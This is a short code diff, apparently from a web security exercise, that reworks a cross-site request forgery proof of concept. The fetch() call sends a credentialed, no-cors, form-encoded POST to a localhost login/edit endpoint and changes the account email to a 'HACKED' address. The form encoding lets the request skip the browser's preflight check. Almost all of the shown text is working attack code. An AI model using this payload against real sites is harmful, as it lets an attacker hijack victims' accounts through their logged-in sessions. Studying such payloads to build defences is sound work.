@@ -14,9 +14,11 @@
       fetch('http://localhost:3333/login/edit', {
         method: 'POST',
         credentials: 'include',
-        body: {
-          email: 'HACKED_sinqueteenteres@test.com',
+        mode: 'no-cors',
+        headers: {
+          'Content-type': 'application/x-www-form-urlencoded',
         },
+        body: 'email=HACKED_sinqueteenteres@test.com',
       })
         .then((res) => res.text())
         .then((text) => console.log(text))
